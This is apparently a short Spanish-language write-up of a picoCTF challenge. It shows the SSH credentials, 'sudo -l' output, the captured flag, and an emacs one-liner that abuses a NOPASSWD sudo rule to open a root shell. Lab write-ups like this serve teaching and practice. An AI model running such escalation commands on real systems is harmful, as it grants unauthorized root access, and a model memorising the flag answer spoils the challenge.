## Descripción 
Can you read the flag? I think you can! ssh -p 53200 ctf-player@green-hill.picoctf.net using password 430838f7
## Solución 
```
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs


# cat flag.txt                                                               
picoCTF{ju57_5ud0_17_c2c0d2e2}
```
picoCTF{ju57_5ud0_17_c2c0d2e2}
## Notas

- sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
	- comando especial que te permite salir a una shell de sistema
	- la shell que se abre dentro de Emacs tendrá privilegios de root
## Referencias